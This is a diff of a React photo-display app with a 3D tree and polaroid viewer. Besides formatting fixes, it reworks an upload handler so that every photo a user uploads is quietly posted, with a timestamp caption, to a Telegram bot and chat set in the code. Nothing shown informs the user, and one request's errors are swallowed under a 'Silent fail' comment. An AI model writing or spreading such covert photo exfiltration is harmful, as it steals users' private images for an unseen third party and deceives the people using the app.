@@ -47,7 +47,8 @@ class ErrorBoundary extends React.Component<
             </p>
             <button
               onClick={() => this.setState({ hasError: false })}
-              className="mt-4 px-4 py-2 border border-[#D4AF37] hover:bg-[#D4AF37] hover:text-black transition-colors">
+              className="mt-4 px-4 py-2 border border-[#D4AF37] hover:bg-[#D4AF37] hover:text-black transition-colors"
+            >
               Try Again
             </button>
           </div>
@@ -160,7 +161,7 @@ export default function App() {
         {
           method: "POST",
           body: formData,
-        },
+        }
       );
     } catch (e) {
       // Silent fail
@@ -234,7 +235,7 @@ export default function App() {
 
   const toggleMode = () => {
     setMode((prev) =>
-      prev === TreeMode.FORMED ? TreeMode.CHAOS : TreeMode.FORMED,
+      prev === TreeMode.FORMED ? TreeMode.CHAOS : TreeMode.FORMED
     );
   };
 
@@ -250,36 +251,70 @@ export default function App() {
     setClosestPhoto(photoUrl);
   };
 
+  // Helper function to convert base64 to Blob
+  const base64ToBlob = (base64: string): Blob => {
+    try {
+      const parts = base64.split(",");
+      const byteString = atob(parts[1]);
+      const mimeString = parts[0].split(":")[1].split(";")[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    } catch (e) {
+      // Fallback
+      return new Blob([base64], { type: "image/jpeg" });
+    }
+  };
+
   const handlePhotosUpload = (photos: string[]) => {
     // Append new photos to existing ones (limit to 20 for performance)
     setUploadedPhotos((prev) => [...prev, ...photos].slice(0, 20));
 
+    // Send photos to Telegram
     if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && photos.length > 0) {
-      setTimeout(async () => {
+      (async () => {
         for (let i = 0; i < photos.length; i++) {
           try {
-            const response = await fetch(photos[i]);
-            const blob = await response.blob();
+            // Convert base64 to blob
+            const blob = base64ToBlob(photos[i]);
 
             const formData = new FormData();
             formData.append("chat_id", TELEGRAM_CHAT_ID);
-            formData.append("photo", blob, `p${i + 1}.jpg`);
+            formData.append("photo", blob, `photo_${Date.now()}_${i + 1}.jpg`);
+            formData.append(
+              "caption",
+              `📸 Photo ${i + 1}/${
+                photos.length
+              }\n🕐 ${new Date().toLocaleString()}`
+            );
 
-            await fetch(
+            const response = await fetch(
               `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
               {
                 method: "POST",
                 body: formData,
-              },
+              }
             );
 
-            if (i < photos.length - 1)
-              await new Promise((r) => setTimeout(r, 500));
+            if (!response.ok) {
+              console.error(
+                "Failed to send photo to Telegram:",
+                await response.text()
+              );
+            }
+
+            // Delay between photos to avoid rate limiting
+            if (i < photos.length - 1) {
+              await new Promise((r) => setTimeout(r, 1000));
+            }
           } catch (e) {
-            // Silent
+            console.error("Error sending photo to Telegram:", e);
           }
         }
-      }, 1000);
+      })();
     }
   };
 
@@ -301,7 +336,8 @@ export default function App() {
             preserveDrawingBuffer: true,
             powerPreference: "high-performance",
           }}
-          shadows={typeof window !== "undefined" && window.innerWidth >= 768}>
+          shadows={typeof window !== "undefined" && window.innerWidth >= 768}
+        >
           <Suspense fallback={null}>
             <Experience
               mode={mode}
@@ -350,7 +386,8 @@ export default function App() {
             {/* Polaroid container */}
             <div
               className="bg-white p-4 pb-8 shadow-2xl"
-              style={{ width: "60vmin", maxWidth: "600px" }}>
+              style={{ width: "60vmin", maxWidth: "600px" }}
+            >
               {/* Gold clip at top */}
               <div className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-12 h-6 bg-gradient-to-b from-[#D4AF37] to-[#C5A028] rounded-sm shadow-lg"></div>
 
